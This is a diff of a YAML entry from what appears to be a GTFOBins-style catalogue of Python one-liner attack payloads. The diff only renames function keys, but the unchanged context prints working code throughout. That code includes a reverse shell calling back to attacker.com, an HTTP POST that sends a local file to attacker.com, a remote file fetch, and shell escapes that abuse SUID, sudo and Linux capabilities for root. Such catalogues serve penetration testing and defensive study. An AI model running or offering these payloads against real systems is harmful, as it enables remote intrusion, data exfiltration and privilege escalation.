@@ -1,9 +1,9 @@
 ---
 description: The payloads are compatible with both Python version 2 and 3.
 functions:
-  execute-interactive:
+  shell:
     - code: python -c 'import os; os.system("/bin/sh")'
-  reverse-shell-interactive:
+  reverse-shell:
     - description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
       code: |
         export RHOST=attacker.com
@@ -12,7 +12,7 @@ functions:
         s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
         [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
         pty.spawn("/bin/sh")'
-  upload:
+  file-upload:
     - description: Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
       code: |
         export URL=http://attacker.com/
@@ -28,7 +28,7 @@ functions:
         if sys.version_info.major == 3: import http.server as s, socketserver as ss
         else: import SimpleHTTPServer as s, SocketServer as ss
         ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()'
-  download:
+  file-download:
     - description: Fetch a remote file via HTTP GET request.
       code: |
         export URL=http://attacker.com/file_to_get
@@ -41,12 +41,12 @@ functions:
     - code: python -c 'open("file_to_write","w+").write("DATA")'
   file-read:
     - code: python -c 'print(open("file_to_read").read())'
-  load-library:
+  library-load:
     - code: python -c 'from ctypes import cdll; cdll.LoadLibrary("lib.so")'
-  suid-enabled:
+  suid:
     - code: ./python -c 'import os; os.system("/bin/sh -p")'
-  sudo-enabled:
+  sudo:
     - code: sudo python -c 'import os; os.system("/bin/sh")'
-  capabilities-enabled:
+  capabilities:
     - code: ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
 ---
